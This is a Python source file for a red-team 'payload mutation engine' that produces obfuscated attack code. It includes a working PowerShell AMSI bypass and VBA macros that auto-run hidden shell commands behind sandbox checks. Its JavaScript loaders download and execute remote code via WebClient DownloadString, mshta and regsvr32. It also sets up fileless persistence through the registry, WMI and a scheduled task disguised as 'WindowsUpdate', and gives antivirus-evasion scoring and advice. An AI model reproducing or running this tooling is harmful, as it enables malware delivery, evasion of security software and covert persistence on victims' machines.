"""
Payload mutation engine — obfuscation and evasion for red team payloads.

Generates obfuscated payloads for:
  - PowerShell (string concat, base64, XOR, AMSI bypass)
  - VBA macros (Chr() encoding, string splitting, auto-open triggers)
  - JavaScript loaders (eval, atob, obfuscated fetch)
  - Fileless execution (registry, WMI, scheduled tasks)

Includes:
  - Sandbox detection payloads
  - AV behavior prediction
  - Static detection scoring

Author: Mr-DS-ML-85
"""

import os
import re
import base64
import random
import string
import hashlib
import logging
import struct
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, field

logger = logging.getLogger("polyglot_shield.payload")


@dataclass
class PayloadResult:
    language: str
    original_hash: str
    mutated_hash: str
    obfuscated_code: str
    technique: str
    detection_score: float  # 0.0 = invisible, 1.0 = instantly detected
    evasion_notes: List[str] = field(default_factory=list)


class PayloadMutator:
    """Payload mutation engine with multi-language obfuscation."""

    # ── PowerShell Obfuscation ──────────────────────────────────

    def obfuscate_powershell(self, payload: str, technique: str = "auto") -> PayloadResult:
        """Obfuscate PowerShell payload."""
        original_hash = hashlib.sha256(payload.encode()).hexdigest()[:16]

        techniques = {
            "string_concat": self._ps_string_concat,
            "base64": self._ps_base64,
            "xor": self._ps_xor,
            "amsi_bypass": self._ps_amsi_bypass,
            "env_var": self._ps_env_var,
            "caret": self._ps_caret_insertion,
            "tick": self._ps_tick_insertion,
            "format_string": self._ps_format_string,
            "reverse": self._ps_reverse,
            "auto": None,
        }

        if technique == "auto":
            technique = random.choice(["string_concat", "base64", "xor", "env_var",
                                       "caret", "tick", "format_string", "reverse"])

        fn = techniques.get(technique, self._ps_string_concat)
        obfuscated, notes = fn(payload)
        mutated_hash = hashlib.sha256(obfuscated.encode()).hexdigest()[:16]

        score = self._score_detection(obfuscated, "powershell")

        return PayloadResult(
            language="powershell",
            original_hash=original_hash,
            mutated_hash=mutated_hash,
            obfuscated_code=obfuscated,
            technique=technique,
            detection_score=score,
            evasion_notes=notes,
        )

    def _ps_string_concat(self, payload: str) -> Tuple[str, List[str]]:
        """Split strings into random chunks and concatenate."""
        notes = ["Breaks signature-based detection of string literals"]
        chunks = []
        i = 0
        while i < len(payload):
            chunk_size = random.randint(2, 6)
            chunk = payload[i:i + chunk_size]
            var = ''.join(random.choices(string.ascii_lowercase, k=4))
            chunks.append(f"${var}='{chunk}'")
            i += chunk_size

        concat_vars = [c.split('=')[0].strip('$') for c in chunks]
        result = '; '.join(chunks) + '; ' + '+'.join(f'${v}' for v in concat_vars) + ' | iex'
        return result, notes

    def _ps_base64(self, payload: str) -> Tuple[str, List[str]]:
        """Base64 encode with -EncodedCommand wrapper."""
        notes = ["Bypasses text-based signature scanning",
                 "Requires -EncodedCommand or [Convert]::FromBase64String"]
        encoded = base64.b64encode(payload.encode('utf-16le')).decode()
        result = f"$b='{encoded}'; $d=[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b)); iex $d"
        return result, notes

    def _ps_xor(self, payload: str) -> Tuple[str, List[str]]:
        """XOR encode payload with random key."""
        key = random.randint(1, 255)
        notes = [f"XOR key: 0x{key:02x}", "Bypasses static string matching"]
        xored = ''.join(chr(ord(c) ^ key) for c in payload)
        encoded = base64.b64encode(xored.encode('latin-1')).decode()
        result = (f"$k=0x{key:02x}; $e=[Convert]::FromBase64String('{encoded}'); "
                  f"$d=($e | ForEach-Object {{ $_ -bxor $k }}); "
                  f"[System.Text.Encoding]::ASCII.GetString($d) | iex")
        return result, notes

    def _ps_amsi_bypass(self, payload: str) -> Tuple[str, List[str]]:
        """Prepend AMSI bypass technique."""
        notes = ["AMSI bypass prepended", "Patch amsiInitFailed to 1"]
        bypass = (
            "$a=[Ref].Assembly.GetTypes();"
            "ForEach($t in $a){if($t.Name -like '*Am*Utils*'){"
            "$t.GetFields('NonPublic,Static')|Where{$_.Name -like '*nit*iled*'}|"
            "ForEach{$_.SetValue($null,$true)}}};"
        )
        result = bypass + payload
        return result, notes

    def _ps_env_var(self, payload: str) -> Tuple[str, List[str]]:
        """Store payload chunks in environment variables."""
        notes = ["Hides payload in environment variables",
                 "Reassembled at runtime"]
        parts = [payload[i:i+20] for i in range(0, len(payload), 20)]
        env_vars = []
        assignments = []
        for i, part in enumerate(parts):
            var_name = f"_e{i}"
            assignments.append(f"$env:{var_name}='{part}'")
            env_vars.append(f"$env:{var_name}")

        result = '; '.join(assignments) + '; ' + '+'.join(env_vars) + ' | iex'
        return result, notes

    def _ps_caret_insertion(self, payload: str) -> Tuple[str, List[str]]:
        """Insert carets (^) between characters (cmd.exe only)."""
        notes = ["CMD-level obfuscation", "Carets ignored by cmd.exe parser"]
        # Only works for cmd.exe commands
        cmd_match = re.match(r'(cmd\s*/c\s*)(.*)', payload, re.IGNORECASE)
        if cmd_match:
            prefix, cmd = cmd_match.groups()
            obf = ''.join(c + '^' if random.random() > 0.4 else c for c in cmd)
            return prefix + obf, notes
        # General: encode as cmd /c with carets
        obf = ''.join(c + '^' if random.random() > 0.4 else c for c in payload)
        return f'cmd /c {obf}', notes

    def _ps_tick_insertion(self, payload: str) -> Tuple[str, List[str]]:
        """Insert backtick (line continuation) in PowerShell strings."""
        notes = ["Backticks ignored in non-quoted context",
                 "Breaks keyword-based signatures"]
        # Insert backticks in known cmdlets
        obf = payload
        for cmdlet in ['Invoke-Expression', 'IEX', 'Invoke-WebRequest',
                       'DownloadString', 'Net.WebClient']:
            if cmdlet in obf:
                ticked = '`'.join(cmdlet[i:i+1] for i in range(len(cmdlet)))
                obf = obf.replace(cmdlet, ticked)
        return obf, notes

    def _ps_format_string(self, payload: str) -> Tuple[str, List[str]]:
        """Use -f format operator to obfuscate strings."""
        notes = ["Format operator breaks string matching"]
        # Extract strings and replace with format operator
        parts = re.findall(r"'[^']+'", payload)
        if not parts:
            # Just wrap the whole thing
            template = ''
            values = []
            for i, c in enumerate(payload):
                if random.random() > 0.3:
                    template += '{}'
                    values.append(f"'{c}'")
                else:
                    template += c
            return f"'{template}' -f {','.join(values)}", notes

        obf = payload
        for part in parts[:5]:  # Limit to avoid excessive obfuscation
            inner = part[1:-1]
            if len(inner) > 2:
                mid = len(inner) // 2
                obf = obf.replace(part, f"('{inner[:mid]}'+'{inner[mid:]}')", 1)
        return obf, notes

    def _ps_reverse(self, payload: str) -> Tuple[str, List[str]]:
        """Reverse the payload string."""
        notes = ["Reversed string at runtime",
                 "Bypasses simple string matching"]
        reversed_payload = payload[::-1]
        encoded = base64.b64encode(reversed_payload.encode()).decode()
        result = (f"$r=[System.Text.Encoding]::UTF8.GetString("
                  f"[Convert]::FromBase64String('{encoded}')); "
                  f"iex ($r[-1..-($r.Length)] -join '')")
        return result, notes

    # ── VBA Macro Generation ────────────────────────────────────

    def generate_vba_macro(self, payload: str, trigger: str = "auto_open",
                           obfuscation: str = "auto") -> PayloadResult:
        """Generate obfuscated VBA macro."""
        original_hash = hashlib.sha256(payload.encode()).hexdigest()[:16]

        if obfuscation == "auto":
            obfuscation = random.choice(["chr", "split", "concat", "replace"])

        if obfuscation == "chr":
            code, notes = self._vba_chr_encoding(payload)
        elif obfuscation == "split":
            code, notes = self._vba_split(payload)
        elif obfuscation == "concat":
            code, notes = self._vba_concat(payload)
        elif obfuscation == "replace":
            code, notes = self._vba_replace(payload)
        else:
            code, notes = self._vba_chr_encoding(payload)

        # Add trigger
        if trigger == "auto_open":
            macro = f"Sub Auto_Open()\n{code}\nEnd Sub\n"
        elif trigger == "document_open":
            macro = f"Sub Document_Open()\n{code}\nEnd Sub\n"
        elif trigger == "workbook_open":
            macro = f"Sub Workbook_Open()\n{code}\nEnd Sub\n"
        elif trigger == "auto_close":
            macro = f"Sub Auto_Close()\n{code}\nEnd Sub\n"
        else:
            macro = f"Sub Auto_Open()\n{code}\nEnd Sub\n"

        # Add sandbox detection
        sandbox_check = self._vba_sandbox_detection()
        macro = sandbox_check + "\n" + macro

        mutated_hash = hashlib.sha256(macro.encode()).hexdigest()[:16]
        score = self._score_detection(macro, "vba")

        return PayloadResult(
            language="vba",
            original_hash=original_hash,
            mutated_hash=mutated_hash,
            obfuscated_code=macro,
            technique=obfuscation,
            detection_score=score,
            evasion_notes=notes,
        )

    def _vba_chr_encoding(self, payload: str) -> Tuple[str, List[str]]:
        """Encode payload using Chr() function."""
        notes = ["Chr() encoding bypasses string-based detection"]
        chr_parts = ' & '.join(f'Chr({ord(c)})' for c in payload)
        code = f'  Dim s As String\n  s = {chr_parts}\n  Shell s, vbHide'
        return code, notes

    def _vba_split(self, payload: str) -> Tuple[str, List[str]]:
        """Split payload across array elements."""
        notes = ["Array splitting avoids monolithic string detection"]
        chunk_size = random.randint(4, 8)
        chunks = [payload[i:i+chunk_size] for i in range(0, len(payload), chunk_size)]
        array_init = ', '.join(f'"{c}"' for c in chunks)
        var = ''.join(random.choices(string.ascii_lowercase, k=6))
        code = (f'  Dim {var}() As String\n'
                f'  {var} = Array({array_init})\n'
                f'  Shell Join({var}, ""), vbHide')
        return code, notes

    def _vba_concat(self, payload: str) -> Tuple[str, List[str]]:
        """Concatenate string fragments."""
        notes = ["Fragment concatenation"]
        parts = [payload[i:i+3] for i in range(0, len(payload), 3)]
        concat = ' & '.join(f'"{p}"' for p in parts)
        code = f'  Shell ({concat}), vbHide'
        return code, notes

    def _vba_replace(self, payload: str) -> Tuple[str, List[str]]:
        """Use Replace() to deobfuscate."""
        notes = ["Replace() deobfuscation pattern"]
        placeholder = payload
        markers = {}
        for i in range(0, len(payload), 5):
            marker = f'##{i}##'
            markers[marker] = payload[i:i+5]
            placeholder = placeholder[:i] + marker + payload[i+len(marker):]

        # Build replacement chain
        result_var = ''.join(random.choices(string.ascii_lowercase, k=6))
        code = f'  Dim {result_var} As String\n  {result_var} = "{placeholder}"\n'
        for marker, value in markers.items():
            code += f'  {result_var} = Replace({result_var}, "{marker}", "{value}")\n'
        code += f'  Shell {result_var}, vbHide'
        return code, notes

    def _vba_sandbox_detection(self) -> str:
        """Generate VBA sandbox detection code."""
        return """Function NotSandbox() As Boolean
    ' Check for common sandbox indicators
    Dim fso As Object
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    ' Check disk size (sandboxes often have small disks)
    If fso.GetDrive("C:").TotalSize < 60000000000 Then
        NotSandbox = False
        Exit Function
    End If
    
    ' Check for sandbox-specific files
    Dim sandbox_files As Variant
    sandbox_files = Array("C:\\sample.exe", "C:\\analysis.exe", _
                          "C:\\iDEFENSE.exe", "C:\\sandbox.exe")
    Dim sf As Variant
    For Each sf In sandbox_files
        If fso.FileExists(sf) Then
            NotSandbox = False
            Exit Function
        End If
    Next sf
    
    ' Check number of processors
    If Environ("NUMBER_OF_PROCESSORS") < 2 Then
        NotSandbox = False
        Exit Function
    End If
    
    NotSandbox = True
End Function

Sub Auto_Open()
    If Not NotSandbox() Then Exit Sub
"""

    # ── JavaScript Loader Generation ────────────────────────────

    def generate_js_loader(self, payload_url: str, technique: str = "auto") -> PayloadResult:
        """Generate obfuscated JavaScript loader."""
        original_hash = hashlib.sha256(payload_url.encode()).hexdigest()[:16]

        if technique == "auto":
            technique = random.choice(["eval_atob", "fetch", "xhr", "wscript",
                                       "mshta", "regsvr32"])

        if technique == "eval_atob":
            code, notes = self._js_eval_atob(payload_url)
        elif technique == "fetch":
            code, notes = self._js_fetch(payload_url)
        elif technique == "xhr":
            code, notes = self._js_xhr(payload_url)
        elif technique == "wscript":
            code, notes = self._js_wscript(payload_url)
        elif technique == "mshta":
            code, notes = self._js_mshta(payload_url)
        elif technique == "regsvr32":
            code, notes = self._js_regsvr32(payload_url)
        else:
            code, notes = self._js_eval_atob(payload_url)

        mutated_hash = hashlib.sha256(code.encode()).hexdigest()[:16]
        score = self._score_detection(code, "javascript")

        return PayloadResult(
            language="javascript",
            original_hash=original_hash,
            mutated_hash=mutated_hash,
            obfuscated_code=code,
            technique=technique,
            detection_score=score,
            evasion_notes=notes,
        )

    def _js_eval_atob(self, url: str) -> Tuple[str, List[str]]:
        """eval(atob()) pattern."""
        notes = ["eval+atob common pattern — high detection rate",
                 "Base64 encoding hides URL"]
        encoded = base64.b64encode(url.encode()).decode()
        # Split the base64 to avoid signature
        mid = len(encoded) // 2
        code = (f"var _a='{encoded[:mid]}';\n"
                f"var _b='{encoded[mid:]}';\n"
                f"eval(atob(_a+_b));")
        return code, notes

    def _js_fetch(self, url: str) -> Tuple[str, List[str]]:
        """fetch() based loader."""
        notes = ["Modern fetch API", "Less common in exploits — lower detection"]
        # Obfuscate URL
        url_parts = [url[i:i+4] for i in range(0, len(url), 4)]
        url_var = ''.join(random.choices(string.ascii_lowercase, k=5))
        code = f"var {url_var}=[{','.join(repr(p) for p in url_parts)}].join('');\n"
        code += f"fetch({url_var}).then(r=>r.text()).then(eval);"
        return code, notes

    def _js_xhr(self, url: str) -> Tuple[str, List[str]]:
        """XMLHttpRequest loader."""
        notes = ["XHR is common but functional",
                 "Async callback avoids blocking"]
        code = (f"var x=new XMLHttpRequest();\n"
                f"x.open('GET','{url}',true);\n"
                f"x.onload=function(){{eval(x.responseText)}};\n"
                f"x.send();")
        return code, notes

    def _js_wscript(self, url: str) -> Tuple[str, List[str]]:
        """WScript.Shell based execution."""
        notes = ["Windows-only", "WScript.Shell commonly flagged"]
        encoded = base64.b64encode(url.encode()).decode()
        code = (f"var s=new ActiveXObject('WScript.Shell');\n"
                f"var u=atob('{encoded}');\n"
                f"s.Run('cmd /c powershell -c \"IEX(New-Object Net.WebClient).DownloadString('+u+')\"',0);")
        return code, notes

    def _js_mshta(self, url: str) -> Tuple[str, List[str]]:
        """Generate mshta-based execution."""
        notes = ["mshta.exe is LOLBin", "Bypasses application whitelisting"]
        encoded = base64.b64encode(url.encode()).decode()
        code = (f"var s=new ActiveXObject('WScript.Shell');\n"
                f"s.Run('mshta vbscript:Execute(\"CreateObject(\\\"WScript.Shell\\\").Run "
                f"\\\"powershell -c IEX(New-Object Net.WebClient).DownloadString(atob(\\'"
                f"{encoded}\\'))\\\"\")(window.close)')")
        return code, notes

    def _js_regsvr32(self, url: str) -> Tuple[str, List[str]]:
        """regsvr32 /s /n /u /i:URL scrobj.dll (Squiblydoo)."""
        notes = ["Squiblydoo technique", "regsvr32 is trusted LOLBin"]
        code = (f"var s=new ActiveXObject('WScript.Shell');\n"
                f"s.Run('regsvr32 /s /n /u /i:{url} scrobj.dll',0);")
        return code, notes

    # ── Sandbox Detection ───────────────────────────────────────

    def generate_sandbox_detector(self, language: str = "powershell") -> str:
        """Generate sandbox/VM detection payload."""
        if language == "powershell":
            return self._ps_sandbox_detect()
        elif language == "vba":
            return self._vba_sandbox_detection()
        elif language == "javascript":
            return self._js_sandbox_detect()
        return ""

    def _ps_sandbox_detect(self) -> str:
        """PowerShell sandbox detection."""
        return """# PolyglotShield Sandbox Detection
$checks = @{}

# 1. Check RAM (sandboxes typically < 4GB)
$ram = (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB
$checks['ram'] = $ram -gt 4

# 2. Check disk size
$disk = (Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='C:'").Size / 1GB
$checks['disk'] = $disk -gt 60

# 3. Check processor count
$checks['cpus'] = (Get-WmiObject Win32_Processor).NumberOfCores -ge 2

# 4. Check for VM/sandbox artifacts
$vm_indicators = @('vmware', 'virtualbox', 'vbox', 'qemu', 'xen', 'sandboxie',
                   'cuckoo', 'joebox', 'anubis', 'threatexpert')
$computer = (Get-WmiObject Win32_ComputerSystem).Model.ToLower()
$checks['no_vm'] = -not ($vm_indicators | Where-Object { $computer -match $_ })

# 5. Check recent user activity
$recent_files = Get-ChildItem "$env:USERPROFILE\\Documents" -ErrorAction SilentlyContinue |
                Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-30) }
$checks['activity'] = ($recent_files | Measure-Object).Count -gt 5

# 6. Check uptime (sandboxes are freshly booted)
$uptime = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
$checks['uptime'] = ((Get-Date) - $uptime).TotalHours -gt 1

# 7. Check for analysis tools
$analysis_tools = @('procmon', 'processhacker', 'wireshark', 'fiddler', 'x64dbg',
                    'ollydbg', 'ida', 'ghidra', 'regshot', 'apimonitor')
$running = Get-Process | Select-Object -ExpandProperty Name -ErrorAction SilentlyContinue
$checks['no_analysis'] = -not ($analysis_tools | Where-Object { $running -match $_ })

# Score: if most checks pass, likely NOT a sandbox
$score = ($checks.Values | Where-Object { $_ }).Count
$is_clean = $score -ge 5

if ($is_clean) {
    Write-Output "Environment verified: not a sandbox"
} else {
    Write-Output "Sandbox detected - aborting"
    exit
}
"""

    def _js_sandbox_detect(self) -> str:
        """JavaScript sandbox detection."""
        return """// Sandbox Detection
var checks = {};

// 1. Check screen resolution
checks.screen = screen.width > 800 && screen.height > 600;

// 2. Check for headless browser indicators
checks.webdriver = !navigator.webdriver;

// 3. Check plugins count
checks.plugins = navigator.plugins.length > 1;

// 4. Check languages
checks.languages = navigator.languages && navigator.languages.length > 0;

// 5. Check timezone
checks.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone !== 'UTC';

// 6. Check canvas fingerprint
try {
    var canvas = document.createElement('canvas');
    var ctx = canvas.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillText('test', 0, 0);
    checks.canvas = canvas.toDataURL().length > 100;
} catch(e) { checks.canvas = false; }

var score = Object.values(checks).filter(Boolean).length;
if (score < 4) {
    console.log('Sandbox detected');
    // Abort
}"""

    # ── Fileless Execution ──────────────────────────────────────

    def generate_fileless(self, payload: str, method: str = "auto") -> PayloadResult:
        """Generate fileless execution technique."""
        original_hash = hashlib.sha256(payload.encode()).hexdigest()[:16]

        if method == "auto":
            method = random.choice(["registry", "wmi", "scheduled_task",
                                     "dll_injection", "process_hollowing"])

        if method == "registry":
            code, notes = self._fileless_registry(payload)
        elif method == "wmi":
            code, notes = self._fileless_wmi(payload)
        elif method == "scheduled_task":
            code, notes = self._fileless_schtask(payload)
        elif method == "dll_injection":
            code, notes = self._fileless_dll_inject(payload)
        elif method == "process_hollowing":
            code, notes = self._fileless_hollowing(payload)
        else:
            code, notes = self._fileless_registry(payload)

        mutated_hash = hashlib.sha256(code.encode()).hexdigest()[:16]
        score = self._score_detection(code, "fileless")

        return PayloadResult(
            language="powershell",
            original_hash=original_hash,
            mutated_hash=mutated_hash,
            obfuscated_code=code,
            technique=method,
            detection_score=score,
            evasion_notes=notes,
        )

    def _fileless_registry(self, payload: str) -> Tuple[str, List[str]]:
        """Store payload in registry, execute from memory."""
        notes = ["Payload stored in registry", "No file on disk", "Survives reboots"]
        encoded = base64.b64encode(payload.encode('utf-16le')).decode()
        code = (f"# Store in registry\n"
                f"Set-ItemProperty -Path 'HKCU:\\Software\\Classes\\CLSID\\{{00000000-0000-0000-0000-000000000001}}' "
                f"-Name '(default)' -Value '{encoded}'\n"
                f"# Execute from registry\n"
                f"$v = Get-ItemProperty -Path 'HKCU:\\Software\\Classes\\CLSID\\{{00000000-0000-0000-0000-000000000001}}' "
                f"-Name '(default)'\n"
                f"$d = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($v.'(default)'))\n"
                f"iex $d")
        return code, notes

    def _fileless_wmi(self, payload: str) -> Tuple[str, List[str]]:
        """Store payload in WMI event subscription."""
        notes = ["WMI persistence", "Triggered by system event", "Hard to detect"]
        encoded = base64.b64encode(payload.encode()).decode()
        code = (f"# Store payload in WMI class\n"
                f"$class = New-Object Management.ManagementClass(New-Object Management.ManagementPath("
                f"'root\\default:PolyglotShield'))\n"
                f"$class.Properties.Add('Payload', '{encoded}')\n"
                f"$class.Put()\n"
                f"# Execute from WMI\n"
                f"$wmi = Get-WmiObject -Namespace root\\default -Class PolyglotShield\n"
                f"$d = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($wmi.Payload))\n"
                f"iex $d")
        return code, notes

    def _fileless_schtask(self, payload: str) -> Tuple[str, List[str]]:
        """Create scheduled task with inline PowerShell."""
        notes = ["Scheduled task persistence", "Runs as SYSTEM possible"]
        encoded = base64.b64encode(payload.encode('utf-16le')).decode()
        code = (f"# Create scheduled task with encoded command\n"
                f"$action = New-ScheduledTaskAction -Execute 'powershell.exe' "
                f"-Argument '-NoP -NonI -W Hidden -Enc {encoded}'\n"
                f"$trigger = New-ScheduledTaskTrigger -Daily -At 3am\n"
                f"Register-ScheduledTask -TaskName 'WindowsUpdate' "
                f"-Action $action -Trigger $trigger -RunLevel Highest")
        return code, notes

    def _fileless_dll_inject(self, payload: str) -> Tuple[str, List[str]]:
        """DLL injection into remote process (conceptual)."""
        notes = ["Conceptual DLL injection", "Requires elevated privileges",
                 "No file dropped on disk"]
        code = (f"# Fileless DLL Injection (conceptual)\n"
                f"# 1. Get target process handle\n"
                f"# 2. Allocate memory in remote process\n"
                f"# 3. Write DLL path or shellcode\n"
                f"# 4. Create remote thread\n"
                f"# Note: Use with caution - for red team exercises only\n"
                f"$proc = Get-Process -Name 'explorer'\n"
                f"# Actual injection would use P/Invoke here\n")
        return code, notes

    def _fileless_hollowing(self, payload: str) -> Tuple[str, List[str]]:
        """Process hollowing (conceptual)."""
        notes = ["Process hollowing technique", "Suspended process replacement",
                 "EDR commonly detects this"]
        code = (f"# Process Hollowing (conceptual)\n"
                f"# 1. Create target process in suspended state\n"
                f"# 2. Unmap original code\n"
                f"# 3. Write payload code\n"
                f"# 4. Resume execution\n"
                f"# Note: For educational/red team purposes\n")
        return code, notes

    # ── Detection Scoring ───────────────────────────────────────

    def _score_detection(self, code: str, language: str) -> float:
        """Score how likely this payload is to be detected (0.0 = invisible, 1.0 = instant)."""
        score = 0.0
        code_lower = code.lower()

        # Known dangerous keywords
        danger_keywords = {
            "powershell": ["invoke-expression", "iex", "downloadstring",
                          "net.webclient", "invoke-mimikatz", "invoke-shellcode",
                          "amsi", "bypass", "-enc", "hidden", "-nop", "-noni"],
            "vba": ["shell", "wscript.shell", "createobject", "auto_open",
                    "document_open", "shell32", "kernel32", "virtualalloc"],
            "javascript": ["eval(", "atob(", "activexobject", "wscript.shell",
                          "document.write", "unescape", "fromcharcode"],
            "fileless": ["set-itemproperty", "register-scheduledtask",
                        "wmi", "invoke-wmimethod", "new-object"],
        }

        keywords = danger_keywords.get(language, [])
        hits = sum(1 for kw in keywords if kw in code_lower)
        score += min(hits * 0.08, 0.5)

        # String entropy (high entropy = suspicious)
        entropy = self._calculate_entropy(code)
        if entropy > 5.0:
            score += 0.1
        if entropy > 6.0:
            score += 0.1

        # Length penalty
        if len(code) > 1000:
            score += 0.05

        # Base64 presence
        if re.search(r'[A-Za-z0-9+/]{40,}={0,2}', code):
            score += 0.1

        # Specific AV trigger patterns
        av_patterns = [
            r'mimikatz', r'invoke-shellcode', r'meterpreter',
            r'cobalt.?strike', r'beacon', r'payload',
            r'exploit', r'overflow', r'shellcode',
        ]
        for pattern in av_patterns:
            if re.search(pattern, code_lower):
                score += 0.15

        return min(round(score, 2), 1.0)

    def _calculate_entropy(self, data: str) -> float:
        """Calculate Shannon entropy of a string."""
        if not data:
            return 0.0
        freq = {}
        for c in data:
            freq[c] = freq.get(c, 0) + 1
        length = len(data)
        entropy = 0.0
        for count in freq.values():
            p = count / length
            if p > 0:
                entropy -= p * (p and __import__('math').log2(p))
        return entropy

    # ── AV Behavior Prediction ──────────────────────────────────

    def predict_av_behavior(self, code: str, language: str) -> Dict[str, Any]:
        """Predict how AV engines would classify this code."""
        detection_score = self._score_detection(code, language)
        indicators = []

        code_lower = code.lower()

        # Check for specific AV trigger patterns
        triggers = {
            "AMSI bypass": ["amsiinitfailed", "amsiutils", "amsi.dll"],
            "Credential dump": ["mimikatz", "sekurlsa", "lsass", "credential"],
            "Shellcode execution": ["virtualalloc", "createthread", "rwx", "shellcode"],
            "Process injection": ["createremotethread", "ntwritevirtualmemory", "inject"],
            "Persistence": ["scheduledtask", "run key", "startup", "wmi event"],
            "Evasion": ["etw patch", "unhook", "syscall", "direct syscall"],
            "Network beacon": ["downloadstring", "invoke-webrequest", "httpget"],
            "Privilege escalation": ["invoke-token", "invoke-bypassuac", "runas"],
        }

        for trigger_name, patterns in triggers.items():
            for pattern in patterns:
                if pattern in code_lower:
                    indicators.append({"trigger": trigger_name, "pattern": pattern})
                    break

        # Severity assessment
        if detection_score > 0.7:
            verdict = "CRITICAL — Likely detected by all major AV engines"
        elif detection_score > 0.5:
            verdict = "HIGH — Detected by most AV engines"
        elif detection_score > 0.3:
            verdict = "MEDIUM — May trigger heuristic detection"
        elif detection_score > 0.1:
            verdict = "LOW — May trigger behavioral analysis"
        else:
            verdict = "MINIMAL — Low detection probability"

        return {
            "detection_score": detection_score,
            "verdict": verdict,
            "indicators": indicators,
            "recommendations": self._get_evasion_recommendations(indicators, language),
        }

    def _get_evasion_recommendations(self, indicators: List[Dict],
                                      language: str) -> List[str]:
        """Get evasion recommendations based on detected indicators."""
        recs = []
        trigger_types = {i["trigger"] for i in indicators}

        if "AMSI bypass" in trigger_types:
            recs.append("Use indirect AMSI bypass (reflection, not direct patching)")
        if "Credential dump" in trigger_types:
            recs.append("Consider using legitimate admin tools instead of Mimikatz")
        if "Shellcode execution" in trigger_types:
            recs.append("Use module stomping or transacted hollowing")
        if "Process injection" in trigger_types:
            recs.append("Use indirect syscalls or hardware breakpoints")
        if "Evasion" in trigger_types:
            recs.append("Use direct syscalls instead of ntdll hooks")
        if "Network beacon" in trigger_types:
            recs.append("Use DNS tunneling or domain fronting")
        if language == "powershell":
            recs.append("Consider Constrained Language Mode bypass")
            recs.append("Use PowerShell v2 (no AMSI)")
        elif language == "vba":
            recs.append("Use DDE instead of VBA macros")
            recs.append("Consider XLM macros (less monitored)")

        return recs if recs else ["Payload appears clean — monitor runtime behavior"]
